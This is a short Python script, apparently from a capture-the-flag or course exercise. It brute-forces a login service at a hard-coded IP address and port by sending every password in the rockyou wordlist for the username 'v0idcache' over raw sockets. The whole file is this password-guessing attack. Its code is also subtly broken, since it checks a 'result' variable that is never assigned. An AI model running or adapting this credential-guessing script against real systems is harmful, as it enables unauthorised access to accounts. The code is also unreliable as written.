import socket
 
host = "142.93.136.81" # IP address here
port = 1337 # Port here
wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file
 
def brute_force():
    """
        Sockets: https://docs.python.org/2/library/socket.html
        How to use the socket s:
            # Establish socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            Reading:
                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
                print(data)             # Prints data
            Sending:
                s.send("something to send\n")   # Send a newline \n at the end of your command
        General idea:
            Given that you know a potential username, use a wordlist and iterate
            through each possible password and repeatedly attempt to login to
            v0idcache's server.
    """
   
    with open(wordlist) as f:
        passwords = f.readlines()
    username = "v0idcache\n"
   
    for password in passwords:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.recv(1024) #username prompt
        s.send(username)
        s.recv(1024) #password prompt
        s.send(password)
        s.recv(1024) #result
        if result != "Fail\n" and result != "" and result != "\n":
            print(password)
            break
 
if __name__ == '__main__':
    brute_force()
